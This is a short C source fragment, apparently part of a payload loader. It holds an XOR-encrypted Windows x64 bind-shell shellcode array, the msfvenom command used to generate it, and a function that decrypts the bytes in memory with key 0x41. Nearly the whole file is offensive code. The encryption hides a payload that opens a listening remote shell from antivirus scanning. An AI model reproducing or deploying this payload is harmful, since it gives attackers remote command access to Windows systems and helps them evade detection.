/*

Generate shellcode with
msfvenom -p windows/x64/shell_bind_tcp -f c --encrypt xor --encrypt-key A LPORT=4444

*/

char shellcode[]=
"\xbd\x09\xc2\xa5\xb1\xa9\x81\x41\x41\x41\x00\x10\x00\x11"
"\x13\x10\x17\x09\x70\x93\x24\x09\xca\x13\x21\x09\xca\x13"
"\x59\x09\xca\x13\x61\x09\xca\x33\x11\x09\x4e\xf6\x0b\x0b"
"\x0c\x70\x88\x09\x70\x81\xed\x7d\x20\x3d\x43\x6d\x61\x00"
"\x80\x88\x4c\x00\x40\x80\xa3\xac\x13\x00\x10\x09\xca\x13"
"\x61\xca\x03\x7d\x09\x40\x91\xca\xc1\xc9\x41\x41\x41\x09"
"\xc4\x81\x35\x26\x09\x40\x91\x11\xca\x09\x59\x05\xca\x01"
"\x61\x08\x40\x91\xa2\x17\x09\xbe\x88\x00\xca\x75\xc9\x09"
"\x40\x97\x0c\x70\x88\x09\x70\x81\xed\x00\x80\x88\x4c\x00"
"\x40\x80\x79\xa1\x34\xb0\x0d\x42\x0d\x65\x49\x04\x78\x90"
"\x34\x99\x19\x05\xca\x01\x65\x08\x40\x91\x27\x00\xca\x4d"
"\x09\x05\xca\x01\x5d\x08\x40\x91\x00\xca\x45\xc9\x09\x40"
"\x91\x00\x19\x00\x19\x1f\x18\x1b\x00\x19\x00\x18\x00\x1b"
"\x09\xc2\xad\x61\x00\x13\xbe\xa1\x19\x00\x18\x1b\x09\xca"
"\x53\xa8\x16\xbe\xbe\xbe\x1c\x08\xff\x36\x32\x73\x1e\x72"
"\x73\x41\x41\x00\x17\x08\xc8\xa7\x09\xc0\xad\xe1\x40\x41"
"\x41\x08\xc8\xa4\x08\xfd\x43\x41\x50\x1d\x41\x41\x41\x41"
"\x00\x15\x08\xc8\xa5\x0d\xc8\xb0\x00\xfb\x0d\x36\x67\x46"
"\xbe\x94\x0d\xc8\xab\x29\x40\x40\x41\x41\x18\x00\xfb\x68"
"\xc1\x2a\x41\xbe\x94\x11\x11\x0c\x70\x88\x0c\x70\x81\x09"
"\xbe\x81\x09\xc8\x83\x09\xbe\x81\x09\xc8\x80\x00\xfb\xab"
"\x4e\x9e\xa1\xbe\x94\x09\xc8\x86\x2b\x51\x00\x19\x0d\xc8"
"\xa3\x09\xc8\xb8\x00\xfb\x83\x9a\x76\x26\xbe\x94\x09\x70"
"\x93\x09\xc8\xb8\x00\xfb\xf6\xa8\x79\xbe\xbe\x94\x0c\x70"
"\x81\x09\x70\x93\x09\xc8\xb8\x00\xfb\x35\xad\x7a\xa0\xbe"
"\x94\x09\xc8\xb8\x09\xc8\x86\x00\xfb\x34\x2f\x0c\x20\xbe"
"\x94\x09\xc0\x85\xe1\x43\x41\x41\x08\xf9\x22\x2c\x25\x41"
"\x41\x41\x41\x41\x00\x11\x00\x11\x09\xc8\xa3\x16\x16\x16"
"\x0c\x70\x81\x2b\x4c\x18\x00\x11\xa3\xbd\x27\x86\x05\x65"
"\x15\x40\x40\x09\xcc\x05\x65\x59\x87\x41\x29\x09\xc8\xa7"
"\x17\x11\x00\x11\x00\x11\x00\x11\x08\xbe\x81\x00\x11\x08"
"\xbe\x89\x0c\xc8\x80\x0d\xc8\x80\x00\xfb\x38\x8d\x7e\xc7"
"\xbe\x94\x09\x70\x93\x09\xbe\x8b\xca\x4f\x00\xfb\x49\xc6"
"\x5c\x21\xbe\x94\xfa\xb1\xf4\xe3\x17\x00\xfb\xe7\xd4\xfc"
"\xdc\xbe\x94\x09\xc2\x85\x69\x7d\x47\x3d\x4b\xc1\xba\xa1"
"\x34\x44\xfa\x06\x52\x33\x2e\x2b\x41\x18\x00\xc8\x9b\xbe"
"\x94";


void DecryptPayload(){
for(int i=0;i<sizeof(shellcode);i++){
        shellcode[i]^=0x41;
    }
}